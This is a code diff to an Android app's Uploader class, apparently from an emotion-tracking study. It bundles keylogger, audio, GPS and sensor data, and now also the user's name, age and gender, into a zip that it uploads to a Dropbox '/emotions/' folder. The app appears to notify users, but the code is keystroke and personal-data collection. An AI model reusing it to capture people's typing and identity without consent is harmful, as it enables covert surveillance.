@@ -35,6 +35,7 @@ public class Uploader {
     public static void upload(boolean audio, boolean keyLogger, boolean gps, boolean times, boolean sensors) throws IOException {
         RegistrableSensorManager rsm = RegistrableSensorManager.Instance;
         Intent service = new Intent(rsm.getApplicationContext(), RegistrableSensorManager.class);
+        service.setAction("com.example.halac.keyloggers_notify.action.startforegroundagain");
         rsm.stopService(service);
         String parent = rsm.getFilesDir().toString() + "/";
         String fileName = rsm.sdf.format(Calendar.getInstance().getTime()).replace(":", "-") + " " + Settings.Secure.getString(rsm.getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID) + ".zip";
@@ -128,6 +129,14 @@ public class Uploader {
             ps.close();
         }
 
+        Users u = rsm.db.getUser();
+        File userInfo = new File(parent + "userInfo.txt");
+        PrintStream ps = new PrintStream(userInfo);
+        ps.println(u.fname + " " + u.lname);
+        ps.println(u.age);
+        ps.println(u.gender);
+        ps.close();
+        filesToUpload.add(parent + "userInfo.txt");
         String[] filesList = new String[filesToUpload.size()];
         filesToUpload.toArray(filesList);
         zipFiles(filesList, filePath);
@@ -136,13 +145,14 @@ public class Uploader {
         DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
         try {
             InputStream in = new FileInputStream(filePath);
-            client.files().uploadBuilder("/" + fileName).uploadAndFinish(in);
+            client.files().uploadBuilder("/emotions/" + fileName).uploadAndFinish(in);
         }
         catch (DbxException e)
         {
             e.printStackTrace();
         }
 
+        userInfo.delete();
         sensorData.delete();
         eventCounts.delete();
         new File(filePath).delete();
